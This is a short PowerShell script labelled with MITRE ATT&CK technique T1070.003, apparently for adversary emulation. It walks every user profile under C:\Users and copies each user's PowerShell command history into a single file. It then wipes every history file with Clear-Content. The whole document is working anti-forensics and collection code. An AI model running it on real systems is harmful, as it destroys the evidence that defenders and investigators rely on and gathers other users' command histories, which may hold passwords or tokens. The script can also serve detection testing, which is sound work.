# T1070.003 - Indicator Removal: Clear Command History

#Retrieve PowerShell History from all users
#Get all users
$users = Get-ChildItem -Path C:\Users

#Get powershell history
ForEach ($user in $users) {
    #Get the user's profile path
    $profilePath = Join-Path -Path $user.FullName -ChildPath 'AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt'
    
    #Check if the user has a Powershell history and save to file
    If (Test-Path -Path $profilePath) {
        $result += "User: $($user.Name)"
        $result += (Get-Content -Path $profilePath)
    }
}
$result | Out-File -FilePath 'PowershellHistory.txt' -Encoding UTF8


#Clean powershell history
ForEach ($user in $users) {
    #Get the user's profile path
    $profilePath = Join-Path -Path $user.FullName -ChildPath 'AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt'
    
    #Check if the user has a Powershell history
    If (Test-Path -Path $profilePath) {
        #Clear the PowerShell history
        Clear-Content -Path $profilePath
    }
}
